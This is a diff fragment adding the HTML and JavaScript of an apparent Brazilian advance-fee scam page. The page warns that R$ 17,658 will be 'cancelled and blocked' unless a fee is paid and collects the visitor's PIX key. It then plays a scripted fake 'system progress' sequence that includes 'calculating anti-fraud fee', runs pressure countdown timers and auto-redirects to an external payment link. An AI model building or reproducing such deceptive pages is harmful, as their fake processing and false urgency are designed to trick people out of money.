+            <div class="bg-red-50 border-2 border-red-500/80 rounded-2xl p-3.5 space-y-1 relative text-left">
+                <div class="flex items-start gap-2.5">
+                    <i class="fa-solid fa-triangle-exclamation text-red-600 text-sm mt-0.5 shrink-0"></i>
+                    <p class="text-[11px] text-red-900 leading-relaxed font-medium">
+                        O não pagamento da taxa fará com que o valor de <strong class="text-red-950 font-bold">R$ 17.658</strong> seja <span class="underline decoration-red-600 decoration-2 font-bold">cancelado e bloqueado</span>.
+                    </p>
+                </div>
+            </div>
+
+            <div class="space-y-3 pt-1">
+                <p class="text-[10px] font-extrabold uppercase tracking-wider text-gray-400 text-center">PROGRESSO DO SISTEMA:</p>
+                <div class="space-y-1.5 text-xs text-gray-700 bg-gray-50 p-3 rounded-xl border border-gray-100 text-left">
+                    <div class="flex items-center gap-2 text-green-600 font-medium">
+                        <i class="fa-solid fa-circle-check"></i> 1. Validando chave inserida...
+                    </div>
+                    <div class="flex items-center gap-2 text-green-600 font-medium">
+                        <i class="fa-solid fa-circle-check"></i> 2. Calculando taxa antifraude...
+                    </div>
+                    <div class="flex items-center gap-2 text-green-600 font-medium">
+                        <i class="fa-solid fa-circle-check"></i> 3. Gerando link de saque seguro...
+                    </div>
+                </div>
+            </div>
+
+            <div class="bg-amber-50 border border-amber-300 rounded-xl p-3 text-amber-900 text-xs font-bold animate-pulse">
+                <i class="fa-solid fa-arrow-right-to-bracket mr-1"></i> Redirecionando em <span id="redirect-countdown" class="text-amber-700 font-extrabold text-sm">5</span> segundos...
+            </div>
+        </div>
+
+    </div>
+
+<script>
+    // Countdown Timer
+    let totalSeconds = 8 * 60 + 51;
+
+    function updateCountdown() {
+        const minutes = Math.floor(totalSeconds / 60);
+        const seconds = totalSeconds % 60;
+        const formattedTime = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+        
+        const topTimer = document.getElementById('countdown');
+        const bottomTimer = document.getElementById('countdown-bottom');
+        
+        if (topTimer) topTimer.innerText = formattedTime;
+        if (bottomTimer) bottomTimer.innerText = formattedTime;
+
+        if (totalSeconds > 0) {
+            totalSeconds--;
+        }
+    }
+
+    setInterval(updateCountdown, 1000);
+
+    // FAQ Toggle accordion
+    function toggleFaq(element) {
+        const answer = element.nextElementSibling;
+        const icon = element.querySelector('i');
+        
+        if (answer.classList.contains('hidden')) {
+            answer.classList.remove('hidden');
+            icon.classList.remove('fa-chevron-down');
+            icon.classList.add('fa-chevron-up');
+            element.classList.add('bg-blue-50', 'border-blue-200');
+        } else {
+            answer.classList.add('hidden');
+            icon.classList.remove('fa-chevron-up');
+            icon.classList.add('fa-chevron-down');
+            element.classList.remove('bg-blue-50', 'border-blue-200');
+        }
+    }
+
+    // Modal Controller Functions
+    const modalContainer = document.getElementById('modal-container');
+    const modalPix = document.getElementById('modal-pix');
+    const modalProcessing = document.getElementById('modal-processing');
+    const modalApproved = document.getElementById('modal-approved');
+
+    function openPixModal() {
+        modalContainer.classList.remove('hidden');
+        modalPix.classList.remove('hidden');
+        modalProcessing.classList.add('hidden');
+        modalApproved.classList.add('hidden');
+    }
+
+    function closeModal() {
+        modalContainer.classList.add('hidden');
+        modalPix.classList.add('hidden');
+        modalProcessing.classList.add('hidden');
+        modalApproved.classList.add('hidden');
+    }
+
+    let redirectTimer = null;
+
+    function startProcessing() {
+        const pixKey = document.getElementById('pix-key-input').value.trim();
+        if(!pixKey) {
+            alert('Por favor, informe a sua chave PIX para prosseguir.');
+            return;
+        }
+
+        modalPix.classList.add('hidden');
+        modalProcessing.classList.remove('hidden');
+
+        // Simulate step-by-step progress
+        setTimeout(() => {
+            document.getElementById('step-2').className = "flex items-center gap-2.5 text-green-600 font-semibold";
+            document.getElementById('icon-2').className = "fa-solid fa-circle-check text-sm";
+            document.getElementById('progress-bar').style.width = "75%";
+            document.getElementById('progress-percent').innerText = "75%";
+        }, 1200);
+
+        setTimeout(() => {
+            document.getElementById('step-3').className = "flex items-center gap-2.5 text-green-600 font-semibold";
+            document.getElementById('icon-3').className = "fa-solid fa-circle-check text-sm";
+            document.getElementById('progress-bar').style.width = "100%";
+            document.getElementById('progress-percent').innerText = "100%";
+        }, 2400);
+
+        setTimeout(() => {
+            modalProcessing.classList.add('hidden');
+            modalApproved.classList.remove('hidden');
+            
+            // Start 5-second automatic redirection countdown
+            let secondsLeft = 5;
+            const counterSpan = document.getElementById('redirect-countdown');
+            
+            if (redirectTimer) clearInterval(redirectTimer);
+            
+            redirectTimer = setInterval(() => {
+                secondsLeft--;
+                if (counterSpan) counterSpan.innerText = secondsLeft;
+                
+                if (secondsLeft <= 0) {
+                    clearInterval(redirectTimer);
+                    window.location.href = 'https://pay.kirvano.com/39a660d5-78e7-48f5-93c6-6bc4104e79db';
+                }
+            }, 1000);
+        }, 3200);
+    }
+
+    // Close modal on background click
+    modalContainer.addEventListener('click', (e) => {
+        if(e.target === modalContainer) {
+            closeModal();
+            if(redirectTimer) clearInterval(redirectTimer);
+        }
+    });
+</script>
+</body>
+</html>
